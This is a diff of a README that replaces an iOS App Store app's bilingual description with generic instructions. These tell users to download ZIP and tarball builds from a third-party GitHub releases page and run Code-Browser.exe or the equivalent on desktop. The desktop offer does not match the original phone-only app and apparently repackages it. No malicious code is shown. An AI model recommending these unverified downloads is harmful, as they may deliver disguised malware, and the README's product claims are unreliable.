@@ -1,100 +1,83 @@
+# 👨‍💻 Code-Browser - Effortless Code Navigation for Everyone
 
-<div align="center">
-<img src="https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/39/9d/00/399d0088-5512-a282-be61-85ece9aa2269/Placeholder.mill/400x400bb-75.webp" width="200" alt="Project logo"/>
-</div>
+![Download Code-Browser](https://img.shields.io/badge/Download%20Code--Browser-latest-blue)
 
-# Code-Browser✨
-The Exclusive Code Browser for Developers
-Browse and edit code efficiently anytime, anywhere!
+## 🚀 Getting Started
 
-Code Browser is a lightweight browser specially designed for developers. It not only allows you to quickly access any URL, but also enables seamless exploration of GitHub repositories, highlights code in more than 100 programming languages, and even lets you modify the code in your private projects directly within the app using online editors such as vscode.dev and github.dev.
+Welcome to Code-Browser, your go-to tool for browsing code smoothly. This guide will help you download and run Code-Browser easily, even if you're not a tech expert.
 
-Key Features
+## 🖥️ System Requirements
 
-- Exclusive Browser for Developers: Lightweight and efficient with fast loading speed, optimized specifically for code browsing, and supports access to any URL.
-- Deep GitHub Integration: Repository search, code retrieval, trend viewing, and private repository management. Take full control of your GitHub projects without switching tools.
-- Intelligent Syntax Highlighting: Automatically highlights code in over 100 programming languages, delivering a clearer and more comfortable code reading experience.
-- In-App Code Editing: Modify the code in your private repositories directly through online editors like vscode.dev and github.dev for efficient development anytime, anywhere.
+Before you start, make sure your computer meets these basic requirements:
 
-Target Users
-• Software Developers: Quickly view, search, and edit code • Tech Learners: Browse excellent open-source projects to enhance programming skills • Project Managers: Track GitHub trends and team code repositories • Programming Enthusiasts: Explore the world of code anytime, anywhere
+- **Operating System:** Windows 10, macOS, or a recent Linux distribution
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum of 200 MB available space
+- **Network:** Internet connection for updates and features
 
-[Download on the App Store](https://apps.apple.com/us/app/code-browser-browser-for-dev/id6757285987)
+## 📥 Download & Install
 
-[<img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="Download on the App Store" width="200">](https://apps.apple.com/us/app/code-browser-browser-for-dev/id6757285987)
+To get Code-Browser, visit this page to download: [Code-Browser Releases](https://github.com/boltastan/Code-Browser/releases).
 
-# 代码浏览器 - 开发者浏览器   
-专为开发者打造的专属代码浏览器  
-随时随地高效浏览与编辑代码！
+1. Click on the link above to go to the Releases page.
+2. Find the most recent version listed at the top.
+3. Look for the file that matches your operating system:
+   - For Windows, you might see something like `Code-Browser-Windows.zip`.
+   - For macOS, look for `Code-Browser-Mac.zip`.
+   - For Linux, check for `Code-Browser-Linux.tar.gz`.
+4. Click on the file name to begin the download.
 
-Code Browser 是一款专为开发者设计的轻量级浏览器。它不仅能让您快速访问任意网址，还能无缝探索 GitHub 仓库、支持 100 多种编程语言的代码高亮，甚至可以直接在应用内通过 vscode.dev 和 github.dev 等在线编辑器修改您私有项目中的代码。
+### 📂 Extract and Run
 
-## 核心功能✨
+Once you have downloaded the file:
 
-- **开发者专属浏览器**：轻量高效、加载迅速，专为代码浏览优化，支持访问任意网址。
-- **深度 GitHub 集成**：仓库搜索、代码获取、趋势查看、私有仓库管理。无需切换工具，全面掌控您的 GitHub 项目。
-- **智能语法高亮**：自动识别并高亮 100 多种编程语言的代码，带来更清晰、舒适的代码阅读体验。
-- **应用内代码编辑**：直接通过 vscode.dev 和 github.dev 等在线编辑器修改私有仓库代码，随时随地高效开发。
+1. **Windows:**
+   - Open the `Downloads` folder.
+   - Right-click on `Code-Browser-Windows.zip` and select "Extract All...".
+   - Open the extracted folder and double-click on `Code-Browser.exe` to start the application.
 
-## 目标用户
-- **软件开发者**：快速查看、搜索和编辑代码  
-- **技术学习者**：浏览优秀开源项目，提升编程能力  
-- **项目经理**：追踪 GitHub 趋势与团队代码仓库  
-- **编程爱好者**：随时随地探索代码世界
-- 
-[马上下载](https://apps.apple.com/us/app/code-browser-browser-for-dev/id6757285987)
+2. **macOS:**
+   - Open your `Downloads` folder.
+   - Double-click on `Code-Browser-Mac.zip` to extract it.
+   - Open the folder and double-click on `Code-Browser.app` to launch it.
 
-[<img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="到 AppStore 下载" width="200">](https://apps.apple.com/us/app/code-browser-browser-for-dev/id6757285987)
+3. **Linux:**
+   - Open your terminal and navigate to your `Downloads` folder.
+   - Run the command: `tar -xzf Code-Browser-Linux.tar.gz`.
+   - Change into the extracted directory: `cd Code-Browser`.
+   - Run the application with: `./Code-Browser`.
 
-| ![图片1](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/78/a3/4c/78a34ca6-e36a-edfd-05ed-feae1a7c1d9a/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.42.03.png/460x996bb.webp) | ![图片2](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/16/66/06/166606c7-d824-3050-6225-f8300dd019b6/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.42.43.png/460x996bb.webp) | ![图片3](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/fb/78/35/fb783570-4a6c-a510-3e09-a4aebde1a61a/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.43.00.png/460x996bb.webp) |
-|:---:|:---:|:---:|
-| ![图片4](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/8e/e8/64/8ee864e0-3388-63b3-97a7-3adf271476b1/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.44.39.png/460x996bb.webp) | ![图片5](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/17/cc/42/17cc427c-def2-ccff-f02c-c28dcb28979e/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.45.10.png/460x996bb.webp) | ![图片6](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/2d/5d/2d/2d5d2d08-c7fb-5f70-c188-5d5adaccf3ca/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.46.25.png/460x996bb.webp) |
-| ![图片7](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/19/84/a3/1984a318-8c38-a6be-c72e-575afa5576e5/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.46.42.png/460x996bb.webp) | ![图片8](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/80/5f/32/805f323e-ce5a-47ad-bbaf-1cf576373e3b/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.46.55.png/460x996bb.webp) | ![图片9](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/c9/73/bc/c973bc93-a5d3-b9e9-2041-4ddb7db77ce2/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.46.47.png/460x996bb.webp) |
+## 🌟 Features
 
-# Code-Browser✨
-The Exclusive Code Browser for Developers
-Browse and edit code efficiently anytime, anywhere!
+Code-Browser comes packed with features designed to make code exploration easy:
 
-Code Browser is a lightweight browser specially designed for developers. It not only allows you to quickly access any URL, but also enables seamless exploration of GitHub repositories, highlights code in more than 100 programming languages, and even lets you modify the code in your private projects directly within the app using online editors such as vscode.dev and github.dev.
+- **Intuitive Interface:** Navigate through your code effortlessly with a user-friendly layout.
+- **Multi-Programming Language Support:** Works with C, Java, Python, Swift, and more.
+- **Integrated Search:** Quickly find variables, functions, and comments within your code.
+- **Code Highlighting:** Enjoy clear syntax highlighting for easier reading and understanding.
+- **Bookmarks and History:** Save your favorite code sections and access your browsing history.
 
-Key Features
+## 🔧 Troubleshooting
 
-- Exclusive Browser for Developers: Lightweight and efficient with fast loading speed, optimized specifically for code browsing, and supports access to any URL.
-- Deep GitHub Integration: Repository search, code retrieval, trend viewing, and private repository management. Take full control of your GitHub projects without switching tools.
-- Intelligent Syntax Highlighting: Automatically highlights code in over 100 programming languages, delivering a clearer and more comfortable code reading experience.
-- In-App Code Editing: Modify the code in your private repositories directly through online editors like vscode.dev and github.dev for efficient development anytime, anywhere.
+If you encounter issues installing or running Code-Browser, here are some common solutions:
 
-Target Users
-• Software Developers: Quickly view, search, and edit code • Tech Learners: Browse excellent open-source projects to enhance programming skills • Project Managers: Track GitHub trends and team code repositories • Programming Enthusiasts: Explore the world of code anytime, anywhere
+- **Not launching:** Make sure your OS is up to date. Restart your computer and try again.
+- **Performance issues:** Close other applications to free up RAM for better performance.
+- **Missing libraries:** On Linux, ensure you have the necessary libraries installed by running: `sudo apt-get install <library-name>`.
 
-[Download on the App Store](https://apps.apple.com/us/app/code-browser-browser-for-dev/id6757285987)
+## 🛠️ Community & Support
 
-[<img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="Download on the App Store" width="200">](https://apps.apple.com/us/app/code-browser-browser-for-dev/id6757285987)
+Need help? Join the Code-Browser community! 
 
-# 代码浏览器 - 开发者浏览器   
-专为开发者打造的专属代码浏览器  
-随时随地高效浏览与编辑代码！
+- Check our [Issue Tracker](https://github.com/boltastan/Code-Browser/issues) for known bugs and fixes.
+- Post questions in the Discussions tab of the GitHub repository.
 
-Code Browser 是一款专为开发者设计的轻量级浏览器。它不仅能让您快速访问任意网址，还能无缝探索 GitHub 仓库、支持 100 多种编程语言的代码高亮，甚至可以直接在应用内通过 vscode.dev 和 github.dev 等在线编辑器修改您私有项目中的代码。
+## 📄 License
 
-## 核心功能✨
+Code-Browser is released under the MIT License. You can use it freely for personal and commercial projects. Please refer to the LICENSE file in the repository for more details.
 
-- **开发者专属浏览器**：轻量高效、加载迅速，专为代码浏览优化，支持访问任意网址。
-- **深度 GitHub 集成**：仓库搜索、代码获取、趋势查看、私有仓库管理。无需切换工具，全面掌控您的 GitHub 项目。
-- **智能语法高亮**：自动识别并高亮 100 多种编程语言的代码，带来更清晰、舒适的代码阅读体验。
-- **应用内代码编辑**：直接通过 vscode.dev 和 github.dev 等在线编辑器修改私有仓库代码，随时随地高效开发。
+## 💬 Feedback
 
-## 目标用户
-- **软件开发者**：快速查看、搜索和编辑代码  
-- **技术学习者**：浏览优秀开源项目，提升编程能力  
-- **项目经理**：追踪 GitHub 趋势与团队代码仓库  
-- **编程爱好者**：随时随地探索代码世界
-- 
-[马上下载](https://apps.apple.com/us/app/code-browser-browser-for-dev/id6757285987)
+We value your input. If you have suggestions or feature requests, please let us know through our [GitHub Discussions](https://github.com/boltastan/Code-Browser/discussions).
 
-[<img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="到 AppStore 下载" width="200">](https://apps.apple.com/us/app/code-browser-browser-for-dev/id6757285987)
-
-| ![图片1](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/78/a3/4c/78a34ca6-e36a-edfd-05ed-feae1a7c1d9a/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.42.03.png/460x996bb.webp) | ![图片2](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/16/66/06/166606c7-d824-3050-6225-f8300dd019b6/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.42.43.png/460x996bb.webp) | ![图片3](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/fb/78/35/fb783570-4a6c-a510-3e09-a4aebde1a61a/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.43.00.png/460x996bb.webp) |
-|:---:|:---:|:---:|
-| ![图片4](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/8e/e8/64/8ee864e0-3388-63b3-97a7-3adf271476b1/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.44.39.png/460x996bb.webp) | ![图片5](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/17/cc/42/17cc427c-def2-ccff-f02c-c28dcb28979e/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.45.10.png/460x996bb.webp) | ![图片6](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/2d/5d/2d/2d5d2d08-c7fb-5f70-c188-5d5adaccf3ca/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.46.25.png/460x996bb.webp) |
-| ![图片7](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/19/84/a3/1984a318-8c38-a6be-c72e-575afa5576e5/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.46.42.png/460x996bb.webp) | ![图片8](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/80/5f/32/805f323e-ce5a-47ad-bbaf-1cf576373e3b/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.46.55.png/460x996bb.webp) | ![图片9](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/c9/73/bc/c973bc93-a5d3-b9e9-2041-4ddb7db77ce2/Simulator_Screenshot_-_iPhone_13_Pro_Max_-_2026-01-02_at_12.46.47.png/460x996bb.webp) |
+Enjoy seamless code browsing with Code-Browser! Don't forget to check for updates often on our [Releases page](https://github.com/boltastan/Code-Browser/releases).
